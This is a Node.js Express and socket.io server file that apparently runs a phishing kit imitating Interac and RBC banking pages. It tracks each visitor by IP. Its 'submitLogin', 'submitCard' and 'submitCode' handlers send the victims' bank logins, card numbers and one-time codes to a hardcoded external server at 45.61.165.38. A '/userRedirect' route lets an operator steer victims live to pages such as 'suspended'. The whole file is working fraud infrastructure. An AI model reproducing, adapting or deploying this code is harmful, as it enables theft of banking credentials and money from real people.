// 1. Constants and Requires
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const IP_PORT = "http://172.86.123.119:3000";
const SERVER_B = "http://45.61.165.38:4000";
let users = [];

// 2. Middleware
app.use(bodyParser.json()); // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// 4. Socket Handling
const handleSocket = (socket) => {
    let userIP = socket.handshake.address;
    socket.join(userIP);
    let user = users.find(u => u.ip === userIP);

    if (user) {
        user.status = true
    } else {
        users.push({ ip: userIP, status: true, banks: 'undefine', page: 'undefine' });
    }

    socket.on('disconnect', () => {
        let user = users.find(u => u.ip === userIP);
        if (user) {
            //console.log("Disconnected: " + user)
            user.status = false
            // Send the updated user list to the dashboard server (Server B)
            axios.post(`${SERVER_B}/updateUser`, users);
        }
    });

    socket.on('updatePage', (page) => {
        // Find the user by their socket ID and update their current page
        let user = users.find(u => u.ip === userIP);
        if (user) {
            user.page = page;
            axios.post(`${SERVER_B}/updateUser`, users);
        }
        //console.log(page)
    });

    socket.on('updateBanks', (banks) => {
        // Find the user by their socket ID and update their current page
        let user = users.find(u => u.ip === userIP);
        if (user) {
            user.banks = banks;
            axios.post(`${SERVER_B}/updateUser`, users);
        }
        //console.log(banks)
    });

    socket.on('submitCode', (data) => {
        let userIP = socket.handshake.address;
        data.ip = userIP.replace('::ffff:', '')
        axios.post(`${SERVER_B}/storeCode`, data);
    });

    socket.on('submitCard', (data) => {
        let userIP = socket.handshake.address;
        data.ip = userIP.replace('::ffff:', '')
        axios.post(`${SERVER_B}/storeCard`, data);
    });
    
    socket.on('submitLogin', (data) => {
        let userIP = socket.handshake.address;
        data.ip = userIP.replace('::ffff:', '')
        axios.post(`${SERVER_B}/storeLogin`, data);
    });

    axios.post(`${SERVER_B}/updateUser`, users);
};

io.on('connection', handleSocket);

// 3. Route Grouping

app.get('/', (req, res) => { res.render('landing/interac/page', { ip: IP_PORT }); });

app.post('/userRedirect', (req, res) => {
    const data = req.body;
    //console.log(data)
    let user = users.find(u => u.ip === data.ip);
    //console.log(user)
    if(user){
        const endpoint = data.endpoint;
        const status = data.status;
        io.to(data.ip).emit('redirectUser', { endpoint,  status});
    } else {
        console.log('User not exist')
    }
    
})

// RBC Routes
app.use('/rbc', require('./routes/rbc'));


// Error/Status Pages
app.get('/blackhole', (req, res) => res.render('blackhole', { ip: IP_PORT }));
app.get('/suspended', (req, res) => res.render('suspended', { ip: IP_PORT }));
app.get('/unavailable', (req, res) => res.render('unavailable', { ip: IP_PORT }));


// Server Startup
const PORT = 3000;
server.listen(PORT, () => console.log(`Server is running on http://localhost:${PORT}`));


